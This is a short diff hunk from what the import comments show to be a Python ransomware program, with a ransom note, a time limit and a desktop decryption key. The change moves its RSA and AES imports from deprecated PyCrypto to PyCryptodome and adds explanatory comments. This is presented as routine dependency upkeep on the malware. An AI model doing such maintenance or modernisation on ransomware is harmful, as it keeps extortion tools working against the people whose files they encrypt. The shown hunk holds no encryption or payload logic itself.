@@ -9,9 +9,11 @@ import time # used to time.sleep interval for ransom note & check desktop to dec
 import datetime # to give time limit on ransom note
 import subprocess # to create process for notepad and open ransom  note
 import win32gui # used to get window text to see if ransom note is on top of all other windows
-from Crypto.PublicKey import RSA
-from Crypto.Random import get_random_bytes
-from Crypto.Cipher import AES, PKCS1_OAEP
+# NOTE: Migrated from deprecated PyCrypto (Crypto.*) to PyCryptodome (Cryptodome.*)
+# PyCrypto is no longer maintained; PyCryptodome is a drop-in replacement with security updates
+from Cryptodome.PublicKey import RSA  # RSA asymmetric encryption for protecting the symmetric key
+from Cryptodome.Random import get_random_bytes  # Cryptographically secure random number generation
+from Cryptodome.Cipher import AES, PKCS1_OAEP  # AES symmetric cipher and RSA OAEP padding scheme
 import base64
 import threading # used for ransom note and decryption key on dekstop
 
